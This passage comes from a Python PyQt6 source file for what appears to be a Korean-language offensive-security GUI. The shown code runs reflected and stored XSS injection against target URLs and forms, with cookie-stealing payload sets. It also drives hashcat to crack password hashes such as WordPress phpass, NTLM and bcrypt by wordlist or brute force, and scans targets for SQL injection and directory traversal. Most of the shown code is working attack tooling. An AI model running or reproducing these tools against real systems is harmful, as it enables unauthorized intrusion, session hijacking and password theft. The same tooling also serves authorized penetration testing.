            payloads += XSS_PAYLOADS
        if self.xss_cookie_cb.isChecked():
            payloads += XSS_COOKIE_PAYLOADS
        threading.Thread(
            target=self._reflected_thread,
            args=(url, cookie, payloads), daemon=True).start()

    def _reflected_thread(self, url, cookie, payloads):
        import time
        session = requests.Session()
        session.headers["User-Agent"] = "Mozilla/5.0"
        if cookie: session.headers["Cookie"] = cookie

        parsed = urllib.parse.urlparse(url)
        qs     = urllib.parse.parse_qs(parsed.query)
        if not qs:
            self._xss_log("[오류] URL에 파라미터가 없어\n", RED); return

        for param in qs.keys():
            self._xss_log(f"\n[파라미터] {param} 테스트 중...\n", YELLOW)
            for payload in payloads:
                if self._xss_stop: break
                try:
                    test_qs = dict(qs)
                    test_qs[param] = [payload]
                    test_url = parsed._replace(
                        query=urllib.parse.urlencode(test_qs, doseq=True)).geturl()
                    r = session.get(test_url, timeout=8, verify=False)

                    # 반사 확인
                    if payload in r.text:
                        self._xss_log(f"  [🚨 반사형] {param} | {payload[:40]}\n", RED)
                        item = QTreeWidgetItem(["반사형 XSS", url[:40], param, payload[:35], "페이로드 반사 확인"])
                        item.setForeground(0, QColor(RED))
                        self.xss_result_tree.addTopLevelItem(item)
                        self.xss_out_tab.setCurrentIndex(1)

                    # 쿠키 노출 확인
                    if "document.cookie" in payload and "cookie" in r.text.lower():
                        self._xss_log(f"  [🍪 쿠키] 쿠키 관련 응답 감지\n", YELLOW)

                    time.sleep(0.1)
                except Exception as e:
                    self._xss_log(f"  [오류] {e}\n", TEXT_DIM)

        self._xss_log(f"\n✓ 반사형 XSS 탐지 완료\n", ACCENT)

    def _run_stored_xss(self):
        store_url = self.xss_store_url.text().strip()
        data_tmpl = self.xss_store_data.text().strip()
        check_url = self.xss_check_url.text().strip()
        if not store_url or not data_tmpl or not check_url:
            QMessageBox.critical(self,"오류","삽입 URL / POST 데이터 / 확인 URL 모두 입력해줘")
            return
        self._xss_stop = False
        self.xss_log.clear()
        self._xss_log("="*48+"\n", BORDER)
        self._xss_log("  저장형 XSS 탐지 시작\n", YELLOW)
        self._xss_log("="*48+"\n\n", BORDER)
        cookie = self.xss_cookie_entry.text().strip()
        threading.Thread(
            target=self._stored_thread,
            args=(store_url, data_tmpl, check_url, cookie), daemon=True).start()

    def _stored_thread(self, store_url, data_tmpl, check_url, cookie):
        import time
        session = requests.Session()
        session.headers["User-Agent"] = "Mozilla/5.0"
        if cookie: session.headers["Cookie"] = cookie

        for payload in XSS_PAYLOADS + XSS_COOKIE_PAYLOADS:
            if self._xss_stop: break
            try:
                # 삽입
                post_data = data_tmpl.replace("XSS_PAYLOAD", payload)
                data_dict = dict(urllib.parse.parse_qsl(post_data))
                self._xss_log(f"\n[삽입] {payload[:40]}...\n", TEXT_DIM)
                session.post(store_url, data=data_dict, timeout=8, verify=False)
                time.sleep(0.5)

                # 확인
                r = session.get(check_url, timeout=8, verify=False)
                found = False
                for marker in XSS_STORED_MARKERS:
                    if marker.lower() in r.text.lower():
                        found = True
                        break

                if found or payload in r.text:
                    self._xss_log(f"  [🚨 저장형] 페이로드 반영 확인!\n", RED)
                    item = QTreeWidgetItem([
                        "저장형 XSS", check_url[:40], "POST",
                        payload[:35], "저장 후 반영 확인"
                    ])
                    item.setForeground(0, QColor(YELLOW))
                    self.xss_result_tree.addTopLevelItem(item)
                    self.xss_out_tab.setCurrentIndex(1)
                else:
                    self._xss_log(f"  [-] 반영 안됨\n", TEXT_DIM)

                time.sleep(0.3)
            except Exception as e:
                self._xss_log(f"  [오류] {e}\n", TEXT_DIM)

        self._xss_log(f"\n✓ 저장형 XSS 탐지 완료\n", ACCENT)

    #  취약점 스캐너 탭
    # ══════════════════════════════════════════════════════
    # ══════════════════════════════════════════════════════
    #  Hashcat 탭
    # ══════════════════════════════════════════════════════
    def _build_hashcat_tab(self, parent):
        lay = QHBoxLayout(parent)
        lay.setContentsMargins(8,8,8,8)
        lay.setSpacing(6)

        left = QWidget(); left.setFixedWidth(360)
        lay.addWidget(left)
        self._build_hashcat_left(left)

        right = QWidget()
        lay.addWidget(right, 1)
        self._build_hashcat_right(right)

    def _build_hashcat_left(self, parent):
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
        inner = QWidget()
        lay   = QVBoxLayout(inner)
        lay.setContentsMargins(12,8,12,8)
        lay.setSpacing(6)
        scroll.setWidget(inner)
        outer = QVBoxLayout(parent)
        outer.setContentsMargins(0,0,0,0)
        outer.addWidget(scroll)

        # 해시 입력
        lay.addWidget(section_label("[ 해시 입력 ]", RED))
        lay.addWidget(sep())
        lay.addWidget(dim_label("해시값 (여러 개는 줄바꿈으로 구분)"))
        self.hash_input = QTextEdit()
        self.hash_input.setFixedHeight(100)
        self.hash_input.setFont(QFont("Courier New", 11))
        self.hash_input.setPlaceholderText(
            "$P$Bh5IdBDsZL1Jmdu6tcXFs.bEXie4Io.\n"
            "5f4dcc3b5aa765d61d8327deb882cf99\n"
            "$2y$10$abcdefghijklmnopqrstuuVG..."
        )
        lay.addWidget(self.hash_input)

        # 해시 타입 자동 감지
        detect_row = QHBoxLayout()
        self.hash_type_detect_btn = btn("🔍  타입 자동 감지", BLUE, "white", h=30)
        self.hash_type_detect_btn.clicked.connect(self._detect_hash_type)
        detect_row.addWidget(self.hash_type_detect_btn)
        lay.addLayout(detect_row)

        lay.addWidget(dim_label("해시 타입 (-m 값)"))
        type_row = QHBoxLayout()
        self.hash_type_combo = QComboBox()
        self.hash_type_combo.setEditable(True)
        hash_types = [
            ("0",    "MD5"),
            ("100",  "SHA1"),
            ("1400", "SHA256"),
            ("1800", "sha512crypt (Linux)"),
            ("400",  "phpass (WordPress)"),
            ("500",  "md5crypt (Unix)"),
            ("1000", "NTLM (Windows)"),
            ("3200", "bcrypt"),
            ("1500", "DES (Unix)"),
            ("5500", "NetNTLMv1"),
            ("5600", "NetNTLMv2"),
        ]
        for code, name in hash_types:
            self.hash_type_combo.addItem(f"{code}  ─  {name}", code)
        self.hash_type_combo.setCurrentIndex(4)  # phpass 기본
        type_row.addWidget(self.hash_type_combo)
        lay.addLayout(type_row)
        self.hash_type_hint = QLabel("")
        self.hash_type_hint.setStyleSheet(f"color:{ACCENT}; font-size:11px;")
        self.hash_type_hint.setWordWrap(True)
        lay.addWidget(self.hash_type_hint)

        # 공격 모드
        lay.addSpacing(4)
        lay.addWidget(section_label("[ 공격 모드 ]", YELLOW))
        lay.addWidget(sep())
        self.attack_grp = QButtonGroup(self)
        attack_modes = [
            (0, "사전 공격 (Wordlist)"),
            (3, "무차별 대입 (Brute-force)"),
            (6, "Wordlist + 규칙"),
        ]
        for mode_id, label in attack_modes:
            rb = QRadioButton(label)
            rb.setChecked(mode_id == 0)
            self.attack_grp.addButton(rb, mode_id)
            lay.addWidget(rb)
        self.attack_grp.buttonClicked.connect(self._on_attack_mode_change)

        # Wordlist
        self.wordlist_frame = QWidget()
        wl_lay = QVBoxLayout(self.wordlist_frame)
        wl_lay.setContentsMargins(0,4,0,0)
        wl_lay.addWidget(dim_label("Wordlist 파일"))
        wl_row = QHBoxLayout()
        self.wordlist_entry = QLineEdit()
        self.wordlist_entry.setPlaceholderText("/usr/share/wordlists/rockyou.txt")
        wl_row.addWidget(self.wordlist_entry)
        wl_pick = btn("📂", BG3, TEXT_DIM, w=36, h=32)
        wl_pick.clicked.connect(self._pick_wordlist)
        wl_row.addWidget(wl_pick)
        wl_lay.addLayout(wl_row)
        lay.addWidget(self.wordlist_frame)

        # Brute-force 마스크
        self.mask_frame = QWidget()
        mk_lay = QVBoxLayout(self.mask_frame)
        mk_lay.setContentsMargins(0,4,0,0)
        mk_lay.addWidget(dim_label("마스크 패턴"))
        self.mask_entry = QLineEdit("?a?a?a?a?a?a")
        mk_lay.addWidget(self.mask_entry)
        mk_lay.addWidget(dim_label("?l=소문자  ?u=대문자  ?d=숫자  ?s=특수  ?a=전체"))
        lay.addWidget(self.mask_frame)
        self.mask_frame.hide()

        # 추가 옵션
        lay.addSpacing(4)
        lay.addWidget(section_label("[ 옵션 ]"))
        lay.addWidget(sep())
        self.hc_opt_vars = {}
        for flag, desc, default in [
            ("--force",          "GPU 경고 무시",     True),
            ("--show",           "크랙된 결과만 표시", False),
            ("--username",       "user:hash 형식",   False),
            ("--increment",      "길이 점진적 증가",  False),
        ]:
            cb = QCheckBox(f"{flag}  ─  {desc}")
            cb.setChecked(default)
            self.hc_opt_vars[flag] = cb
            lay.addWidget(cb)

        lay.addWidget(dim_label("추가 플래그"))
        self.hc_extra = QLineEdit()
        self.hc_extra.setPlaceholderText("--increment-min=4 --increment-max=8")
        lay.addWidget(self.hc_extra)

        lay.addWidget(dim_label("hashcat 경로"))
        self.hc_bin = QLineEdit()
        self.hc_bin.setText(self._find_hashcat())
        lay.addWidget(self.hc_bin)

        lay.addSpacing(6)
        lay.addWidget(sep())

        run_row = QHBoxLayout()
        self.hc_run_btn = btn("▶  크랙 시작", RED, "white", h=40)
        self.hc_run_btn.clicked.connect(self._run_hashcat)
        self.hc_stop_btn = btn("■  중지", BG3, TEXT_DIM, h=40)
        self.hc_stop_btn.setEnabled(False)
        self.hc_stop_btn.clicked.connect(self._stop_hashcat)
        run_row.addWidget(self.hc_run_btn)
        run_row.addWidget(self.hc_stop_btn)
        lay.addLayout(run_row)
        lay.addStretch()

    def _build_hashcat_right(self, parent):
        lay = QVBoxLayout(parent)
        lay.setContentsMargins(0,0,0,0)

        self.hc_out_tab = QTabWidget()
        lay.addWidget(self.hc_out_tab)

        # 실행 로그
        log_w = QWidget()
        ll = QVBoxLayout(log_w); ll.setContentsMargins(4,4,4,4)
        self.hc_log = QTextEdit()
        self.hc_log.setReadOnly(True)
        self.hc_log.setFont(QFont("Courier New", 11))
        ll.addWidget(self.hc_log)
        bot = QWidget(); bot.setFixedHeight(30)
        bot.setStyleSheet(f"background:{BG3};")
        bl = QHBoxLayout(bot); bl.setContentsMargins(8,2,8,2)
        self.hc_time_lbl = QLabel("")
        self.hc_time_lbl.setStyleSheet(f"color:{TEXT_DIM}; font-size:10px;")
        clr_btn = btn("클리어", BG3, TEXT_DIM, w=70, h=24)
        clr_btn.clicked.connect(lambda: self.hc_log.clear())
        bl.addWidget(clr_btn); bl.addStretch(); bl.addWidget(self.hc_time_lbl)
        ll.addWidget(bot)
        self.hc_out_tab.addTab(log_w, "📋  실행 로그")

        # 크랙 결과
        res_w = QWidget()
        rl = QVBoxLayout(res_w); rl.setContentsMargins(4,4,4,4)

        res_header = QWidget()
        rhl = QHBoxLayout(res_header); rhl.setContentsMargins(0,0,0,4)
        self.hc_result_count = QLabel("크랙된 해시: 0개")
        self.hc_result_count.setStyleSheet(f"color:{ACCENT}; font-weight:bold;")
        copy_all_btn = btn("전체 복사", BG3, TEXT_DIM, w=90, h=26)
        copy_all_btn.clicked.connect(self._copy_hc_results)
        rhl.addWidget(self.hc_result_count); rhl.addStretch(); rhl.addWidget(copy_all_btn)
        rl.addWidget(res_header)

        self.hc_result_tree = QTreeWidget()
        self.hc_result_tree.setAlternatingRowColors(True)
        self.hc_result_tree.setRootIsDecorated(False)
        self.hc_result_tree.setHeaderLabels(["해시","크랙된 비밀번호","해시타입"])
        self.hc_result_tree.header().setSectionResizeMode(QHeaderView.ResizeMode.ResizeToContents)
        rl.addWidget(self.hc_result_tree)
        rl.addWidget(dim_label("더블클릭 → 비밀번호 클립보드 복사"))
        self.hc_result_tree.itemDoubleClicked.connect(
            lambda item: QApplication.clipboard().setText(item.text(1)))
        self.hc_out_tab.addTab(res_w, "🔑  크랙 결과")

    # ── Hashcat 로직 ─────────────────────────────────────
    def _find_hashcat(self):
        for c in ["hashcat", "/opt/homebrew/bin/hashcat",
                  "/usr/local/bin/hashcat", "/usr/bin/hashcat"]:
            try:
                r = subprocess.run([c, "--version"],
                                   capture_output=True, text=True, timeout=3)
                if r.returncode == 0: return c
            except Exception: pass
        return "hashcat"

    def _on_attack_mode_change(self):
        mode = self.attack_grp.checkedId()
        self.wordlist_frame.setVisible(mode in (0, 6))
        self.mask_frame.setVisible(mode == 3)

    def _pick_wordlist(self):
        path, _ = QFileDialog.getOpenFileName(
            self, "Wordlist 선택", "/usr/share/wordlists",
            "Text (*.txt);;All (*.*)")
        if path: self.wordlist_entry.setText(path)

    def _detect_hash_type(self):
        hashes = self.hash_input.toPlainText().strip().splitlines()
        if not hashes:
            QMessageBox.critical(self,"오류","해시를 입력해줘"); return
        h = hashes[0].strip()
        detected = self._identify_hash(h)
        self.hash_type_hint.setText(f"감지됨: {detected['name']}  (-m {detected['code']})")
        # 콤보에서 해당 항목 선택
        for i in range(self.hash_type_combo.count()):
            if self.hash_type_combo.itemData(i) == detected["code"]:
                self.hash_type_combo.setCurrentIndex(i)
                break
        self._hc_log(f"해시 타입 감지: {detected['name']}  (-m {detected['code']})\n", ACCENT)

    def _identify_hash(self, h):
        import re
        h = h.strip()
        if h.startswith("$P$") or h.startswith("$H$"):
            return {"code":"400",  "name":"phpass (WordPress/Drupal)"}
        if h.startswith("$2y$") or h.startswith("$2b$") or h.startswith("$2a$"):
            return {"code":"3200", "name":"bcrypt"}
        if h.startswith("$6$"):
            return {"code":"1800", "name":"sha512crypt (Linux)"}
        if h.startswith("$5$"):
            return {"code":"7400", "name":"sha256crypt (Linux)"}
        if h.startswith("$1$"):
            return {"code":"500",  "name":"md5crypt (Unix)"}
        if re.fullmatch(r"[0-9a-fA-F]{32}", h):
            return {"code":"0",    "name":"MD5"}
        if re.fullmatch(r"[0-9a-fA-F]{40}", h):
            return {"code":"100",  "name":"SHA1"}
        if re.fullmatch(r"[0-9a-fA-F]{64}", h):
            return {"code":"1400", "name":"SHA256"}
        if re.fullmatch(r"[0-9a-fA-F]{128}", h):
            return {"code":"1700", "name":"SHA512"}
        if re.fullmatch(r"[0-9a-fA-F]{16}", h):
            return {"code":"1000", "name":"NTLM (Windows)"}
        return {"code":"0", "name":"알 수 없음 (MD5 추정)"}

    def _run_hashcat(self):
        hashes = self.hash_input.toPlainText().strip()
        if not hashes:
            QMessageBox.critical(self,"오류","해시를 입력해줘"); return
        hc_bin = self.hc_bin.text().strip() or "hashcat"
        mode   = self.attack_grp.checkedId()
        # 해시 타입
        idx    = self.hash_type_combo.currentIndex()
        m_code = self.hash_type_combo.itemData(idx) or "0"

        # 임시 해시 파일 저장
        import tempfile
        self._hc_hash_file = tempfile.NamedTemporaryFile(
            mode="w", suffix=".txt", delete=False)
        self._hc_hash_file.write(hashes)
        self._hc_hash_file.close()

        cmd = [hc_bin, "-m", m_code, "-a", str(mode),
               self._hc_hash_file.name]

        if mode in (0, 6):
            wl = self.wordlist_entry.text().strip()
            if not wl:
                QMessageBox.critical(self,"오류","Wordlist 파일을 선택해줘"); return
            cmd.append(wl)
        elif mode == 3:
            mask = self.mask_entry.text().strip() or "?a?a?a?a?a?a"
            cmd.append(mask)

        for flag, cb in self.hc_opt_vars.items():
            if cb.isChecked(): cmd.append(flag)

        extra = self.hc_extra.text().strip()
        if extra: cmd += extra.split()

        self.hc_log.clear()
        self.hc_result_tree.clear()
        self._hc_results = []
        self._hc_log("="*48+"\n", TEXT_DIM)
        self._hc_log(f"  hashcat 실행\n", YELLOW)
        self._hc_log(f"  모드: {mode}  타입: -m {m_code}\n", TEXT_DIM)
        self._hc_log(f"$ {' '.join(cmd)}\n\n", ACCENT2)
        self._hc_log("="*48+"\n\n", TEXT_DIM)

        self.hc_run_btn.setEnabled(False)
        self.hc_stop_btn.setEnabled(True)
        self._set_status("● CRACKING", RED)

        self._hc_process = None
        threading.Thread(target=self._hc_thread, args=(cmd,), daemon=True).start()

    def _hc_thread(self, cmd):
        import re as re2
        cracked = []
        try:
            self._hc_process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT, text=True, bufsize=1)
            for line in self._hc_process.stdout:
                self._hc_log(line, self._hc_tag(line))
                # 크랙 결과 파싱: hash:password
                m = re2.match(r"^(.+):(.+)$", line.strip())
                if m and len(m.group(1)) > 8:
                    cracked.append((m.group(1), m.group(2)))
                    QMetaObject.invokeMethod(
                        self, "_hc_add_result",
                        Qt.ConnectionType.QueuedConnection)
                    self._hc_last = (m.group(1), m.group(2))
            self._hc_process.wait()
            rc = self._hc_process.returncode
        except FileNotFoundError:
            self._hc_log("\n[오류] hashcat을 찾을 수 없어\nbrew install hashcat\n", RED)
            rc = -1
        except Exception as e:
            self._hc_log(f"\n[예외] {e}\n", RED); rc = -1

        self._hc_cracked = cracked
        QMetaObject.invokeMethod(self, "_hc_done",
            Qt.ConnectionType.QueuedConnection)

    def _hc_tag(self, line):
        l = line.lower()
        if "cracked" in l or "recovered" in l: return ACCENT
        if "error" in l or "failed" in l:      return RED
        if "warning" in l:                     return YELLOW
        if "progress" in l or "speed" in l:    return BLUE
        if ":" in line and len(line.strip()) > 10: return YELLOW
        return TEXT_DIM

    @pyqtSlot()
    def _hc_add_result(self):
        last = getattr(self, "_hc_last", None)
        if not last: return
        h, pw = last
        item = QTreeWidgetItem([h[:50], pw, self.hash_type_combo.currentText()[:30]])
        item.setForeground(1, QColor(ACCENT))
        self.hc_result_tree.addTopLevelItem(item)
        self.hc_result_count.setText(f"크랙된 해시: {self.hc_result_tree.topLevelItemCount()}개")
        self.hc_out_tab.setCurrentIndex(1)

    @pyqtSlot()
    def _hc_done(self):
        self.hc_run_btn.setEnabled(True)
        self.hc_stop_btn.setEnabled(False)
        cracked = getattr(self, "_hc_cracked", [])
        self._hc_log(f"\n크랙 완료  |  {len(cracked)}개 발견\n", ACCENT if cracked else TEXT_DIM)
        self._set_status(f"● DONE  |  {len(cracked)}개 크랙", ACCENT if cracked else TEXT_DIM)
        # 임시 파일 삭제
        try:
            os.unlink(self._hc_hash_file.name)
        except Exception: pass
        self.hc_time_lbl.setText(datetime.now().strftime("%H:%M:%S"))

    def _stop_hashcat(self):
        if self._hc_process:
            self._hc_process.terminate()
            self._hc_log("\n[!] 강제 종료\n", YELLOW)
        self.hc_run_btn.setEnabled(True)
        self.hc_stop_btn.setEnabled(False)

    def _copy_hc_results(self):
        lines = []
        for i in range(self.hc_result_tree.topLevelItemCount()):
            item = self.hc_result_tree.topLevelItem(i)
            lines.append(f"{item.text(0)}:{item.text(1)}")
        if lines:
            QApplication.clipboard().setText("\n".join(lines))
            QMessageBox.information(self,"복사됨",f"{len(lines)}개 복사됨")

    def _hc_log(self, text, color=None):
        c = color or TEXT_DIM
        cursor = self.hc_log.textCursor()
        cursor.movePosition(QTextCursor.MoveOperation.End)
        fmt = cursor.charFormat()
        fmt.setForeground(QColor(c))
        cursor.setCharFormat(fmt)
        cursor.insertText(text)
        self.hc_log.setTextCursor(cursor)
        self.hc_log.ensureCursorVisible()
        self.hc_time_lbl.setText(datetime.now().strftime("%H:%M:%S"))

    def _build_scanner_tab(self, parent):
        lay = QHBoxLayout(parent)
        lay.setContentsMargins(8,8,8,8); lay.setSpacing(6)

        left = QWidget(); left.setFixedWidth(300)
        lay.addWidget(left)
        self._build_scanner_left(left)

        right = QWidget()
        lay.addWidget(right, 1)
        self._build_scanner_right(right)

    def _build_scanner_left(self, parent):
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
        inner = QWidget()
        lay   = QVBoxLayout(inner)
        lay.setContentsMargins(12,8,12,8); lay.setSpacing(4)
        scroll.setWidget(inner)
        outer = QVBoxLayout(parent)
        outer.setContentsMargins(0,0,0,0); outer.addWidget(scroll)

        lay.addWidget(section_label("[ TARGET ]", BLUE)); lay.addWidget(sep())
        lay.addWidget(dim_label("대상 URL"))
        self.scan_url_entry = QLineEdit()
        self.scan_url_entry.setPlaceholderText("http://192.168.x.x/")
        lay.addWidget(self.scan_url_entry)
        lay.addWidget(dim_label("쿠키 (선택)"))
        self.scan_cookie_entry = QLineEdit()
        lay.addWidget(self.scan_cookie_entry)

        lay.addSpacing(8)
        lay.addWidget(section_label("[ 탐지 항목 ]", BLUE)); lay.addWidget(sep())
        self.scan_vars = {}
        for key, label, color in [
            ("sqli","🔴 SQL Injection",RED),
            ("xss","🟡 XSS (반사형)",YELLOW),
            ("traversal","🟠 Directory Traversal",ACCENT2),
            ("info","🟣 정보 노출 경로",PURPLE),
        ]:
            cb = QCheckBox(label)
            cb.setChecked(True)
            cb.setStyleSheet(f"""
                QCheckBox {{ color: {color}; font-size: 12px; }}
                QCheckBox::indicator {{ width:16px; height:16px; border:1px solid {BORDER}; border-radius:3px; background:{BG3}; }}
                QCheckBox::indicator:checked {{ background:{color}; border-color:{color}; }}
            """)
            self.scan_vars[key] = cb
            lay.addWidget(cb)

        lay.addSpacing(8)
        lay.addWidget(section_label("[ 옵션 ]", BLUE)); lay.addWidget(sep())
        row = QHBoxLayout()
        row.addWidget(dim_label("딜레이(초)"))
        self.scan_delay_entry = QLineEdit("0.3"); self.scan_delay_entry.setFixedWidth(55)
        row.addWidget(self.scan_delay_entry)
        row.addSpacing(10)
        row.addWidget(dim_label("타임아웃"))
        self.scan_timeout_entry = QLineEdit("5"); self.scan_timeout_entry.setFixedWidth(50)
        row.addWidget(self.scan_timeout_entry)
        row.addStretch(); lay.addLayout(row)

        lay.addSpacing(8); lay.addWidget(sep())
        self.scan_run_btn = btn("▶  스캔 시작", BLUE, BG)
        self.scan_run_btn.clicked.connect(self._start_scan)
        lay.addWidget(self.scan_run_btn)
        self.scan_stop_btn = btn("■  중지", RED, "white")
        self.scan_stop_btn.setEnabled(False)
        self.scan_stop_btn.clicked.connect(self._stop_scan)
        lay.addWidget(self.scan_stop_btn)
        report_btn = btn("📄  리포트 저장", BG3, TEXT_DIM)
        report_btn.clicked.connect(self._save_scan_report)
        lay.addWidget(report_btn)
        lay.addStretch()

    def _build_scanner_right(self, parent):
        lay = QVBoxLayout(parent)
        lay.setContentsMargins(0,0,0,0)
        self.scan_tab = QTabWidget()
        lay.addWidget(self.scan_tab)

        # 로그
        log_w = QWidget()
        ll = QVBoxLayout(log_w); ll.setContentsMargins(4,4,4,4)
        self.scan_log = QTextEdit()
        self.scan_log.setReadOnly(True)
        self.scan_log.setFont(QFont("Courier New", 11))
        ll.addWidget(self.scan_log)
        self.scan_tab.addTab(log_w, "📋  스캔 로그")

        # 취약점
        vuln_w = QWidget()
        vl = QVBoxLayout(vuln_w); vl.setContentsMargins(4,4,4,4)
        self.vuln_tree = QTreeWidget()
        self.vuln_tree.setAlternatingRowColors(True)
        self.vuln_tree.setRootIsDecorated(False)
        self.vuln_tree.setHeaderLabels(["유형","URL","파라미터","페이로드","위험도"])
        self.vuln_tree.header().setSectionResizeMode(QHeaderView.ResizeMode.ResizeToContents)
        vl.addWidget(self.vuln_tree)
        self.scan_tab.addTab(vuln_w, "🚨  취약점 목록")

        # 리포트
        rep_w = QWidget()
        rl = QVBoxLayout(rep_w); rl.setContentsMargins(4,4,4,4)
        self.scan_report = QTextEdit()
        self.scan_report.setReadOnly(True)
        self.scan_report.setFont(QFont("Courier New", 11))
        rl.addWidget(self.scan_report)
        self.scan_tab.addTab(rep_w, "📊  리포트")

    # ══════════════════════════════════════════════════════
    #  로그 출력
    # ══════════════════════════════════════════════════════
    TAG_COLORS = {
        "info":    TEXT,
        "success": ACCENT,
        "warn":    YELLOW,
        "error":   RED,
        "cmd":     ACCENT2,
        "dim":     TEXT_DIM,
        "step":    BLUE,
        "found":   YELLOW,
    }

    def _log(self, text, tag="info"):
        color = self.TAG_COLORS.get(tag, TEXT)
        cursor = self.output.textCursor()
        cursor.movePosition(QTextCursor.MoveOperation.End)
        fmt = cursor.charFormat()
        fmt.setForeground(QColor(color))
        cursor.setCharFormat(fmt)
        cursor.insertText(text)
        self.output.setTextCursor(cursor)
        self.output.ensureCursorVisible()
        self.time_lbl.setText(datetime.now().strftime("%H:%M:%S"))

    def _slog(self, text, tag="info"):
        color = self.TAG_COLORS.get(tag, TEXT)
        cursor = self.scan_log.textCursor()
        cursor.movePosition(QTextCursor.MoveOperation.End)
        fmt = cursor.charFormat()
        fmt.setForeground(QColor(color))
        cursor.setCharFormat(fmt)
        cursor.insertText(text)
        self.scan_log.setTextCursor(cursor)
        self.scan_log.ensureCursorVisible()

    def _clear(self):
        self.output.clear()

    def _save(self):
        path, _ = QFileDialog.getSaveFileName(
            self, "저장", f"sqlmap_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
            "Text (*.txt);;All (*.*)")
        if path:
            with open(path,"w",encoding="utf-8") as f:
                f.write(self.output.toPlainText())

    def _set_status(self, text, color=TEXT_DIM):
        self.status_lbl.setText(text)
        self.status_lbl.setStyleSheet(f"color: {color}; font-size: 12px;")

    # ══════════════════════════════════════════════════════
    #  모드 전환 / 파일 / 탐지
    # ══════════════════════════════════════════════════════
    def _on_mode_change(self):
        mode = self.mode_grp.checkedId()
        self.file_btn.setVisible(mode == 2)
        self.post_widget.setVisible(mode == 1)

    def _pick_file(self):
        path, _ = QFileDialog.getOpenFileName(self, "요청파일 선택","","Text (*.txt);;All (*.*)")
        if path: self.url_entry.setText(path)

    def _detect_params(self, url, callback, btn=None):
        """공통 파라미터 탐지 - callback(found) 으로 결과 전달"""
        if not url: return
        if not url.startswith("http"): url = "http://"+url
        if btn: btn.setText("🔄  탐지 중..."); btn.setEnabled(False)
        self._detect_callback = callback
        self._detect_btn_ref  = btn
        threading.Thread(target=self._detect_params_thread, args=(url,), daemon=True).start()

    def _detect_params_thread(self, url):
        try:
            session = requests.Session()
            session.headers["User-Agent"] = "Mozilla/5.0"
            r = session.get(url, timeout=8, verify=False)
            soup = BeautifulSoup(r.text, "html.parser")
            found = []
            parsed = urllib.parse.urlparse(url)
            for key in urllib.parse.parse_qs(parsed.query):
                full = parsed._replace(query=urllib.parse.urlencode({key:"1"})).geturl()
                found.append((f"[GET] ?{key}=", full))
            for form in soup.find_all("form"):
                action = urllib.parse.urljoin(url, form.get("action",""))
                method = form.get("method","get").lower()
                for inp in form.find_all(["input","textarea"]):
                    name = inp.get("name")
                    if name:
                        if method == "get":
                            found.append((f"[GET FORM] {name}", f"{action}?{name}=1"))
                        else:
                            found.append((f"[POST FORM] {name}", f"{action}||POST||{name}=1"))
            for a in soup.find_all("a", href=True):
                href = urllib.parse.urljoin(url, a["href"])
                p2 = urllib.parse.urlparse(href)
                for key in urllib.parse.parse_qs(p2.query):
                    full = p2._replace(query=urllib.parse.urlencode({key:"1"})).geturl()
                    if not any(f[1]==full for f in found):
                        found.append((f"[LINK] {p2.path}?{key}=", full))
            self._detect_found_common = found
        except Exception:
            self._detect_found_common = []
        from PyQt6.QtCore import QMetaObject
        QMetaObject.invokeMethod(self, "_detect_params_done",
            Qt.ConnectionType.QueuedConnection)

    @pyqtSlot()
    def _detect_params_done(self):
        found = getattr(self, "_detect_found_common", [])
        btn   = getattr(self, "_detect_btn_ref", None)
        cb    = getattr(self, "_detect_callback", None)
        if btn: btn.setText("🔎  파라미터 자동 탐지"); btn.setEnabled(True)
        if cb: cb(found)

    def _xss_auto_detect(self):
        url = self.xss_url_entry.text().strip()
        if not url: QMessageBox.critical(self,"오류","URL 입력해줘"); return
        self._detect_params(url, self._xss_detect_done, self.xss_detect_btn)

    def _auto_detect(self):
        url = self.url_entry.text().strip()
        if not url: QMessageBox.critical(self,"오류","URL을 입력해줘"); return
        if not url.startswith("http"): url = "http://"+url
        self.detect_btn.setText("🔄  탐지 중...")
        self.detect_btn.setEnabled(False)
        threading.Thread(target=self._detect_thread, args=(url,), daemon=True).start()

    def _detect_thread(self, url):
        try:
            session = requests.Session()
            session.headers["User-Agent"] = "Mozilla/5.0"
            r = session.get(url, timeout=8, verify=False)
            soup = BeautifulSoup(r.text, "html.parser")
            found = []
            parsed = urllib.parse.urlparse(url)
            for key in urllib.parse.parse_qs(parsed.query):
                full = parsed._replace(query=urllib.parse.urlencode({key:"1"})).geturl()
                found.append((f"[GET] ?{key}=", full))
            for form in soup.find_all("form"):
                action = urllib.parse.urljoin(url, form.get("action",""))
                method = form.get("method","get").lower()
                for inp in form.find_all(["input","textarea"]):
                    name = inp.get("name")
                    if name:
                        if method == "get":
                            found.append((f"[GET FORM] {name}", f"{action}?{name}=1"))
                        else:
                            found.append((f"[POST FORM] {name}", f"{action}||POST||{name}=1"))
            for a in soup.find_all("a", href=True):
                href = urllib.parse.urljoin(url, a["href"])
                p2 = urllib.parse.urlparse(href)
                for key in urllib.parse.parse_qs(p2.query):
                    full = p2._replace(query=urllib.parse.urlencode({key:"1"})).geturl()
                    if not any(f[1]==full for f in found):
                        found.append((f"[LINK] {p2.path}?{key}=", full))
            from PyQt6.QtCore import QMetaObject, Q_ARG
            QMetaObject.invokeMethod(self, "_detect_done_slot",
                Qt.ConnectionType.QueuedConnection)
            self._detect_found = found
        except Exception as e:
            self._detect_found = []
            from PyQt6.QtCore import QMetaObject
            QMetaObject.invokeMethod(self, "_detect_done_slot",
                Qt.ConnectionType.QueuedConnection)

    @pyqtSlot()
    def _detect_done_slot(self):
        found = getattr(self, "_detect_found", [])
        self.detect_btn.setText("🔎  파라미터 자동 탐지")
        self.detect_btn.setEnabled(True)
        if not found:
            QMessageBox.information(self,"결과","파라미터를 찾지 못했어"); return
        self.detected_params = found
        self.param_combo.clear()
        for label, _ in found:
            self.param_combo.addItem(label)
        self._on_param_select(0)
        self._log(f"✓ 파라미터 {len(found)}개 탐지됨\n","found")

    def _on_param_select(self, idx):
        if idx < 0 or idx >= len(self.detected_params): return
        label, full = self.detected_params[idx]
        if "||POST||" in full:
            parts = full.split("||POST||")
            self.rb_post.setChecked(True); self._on_mode_change()
            self.url_entry.setText(parts[0])
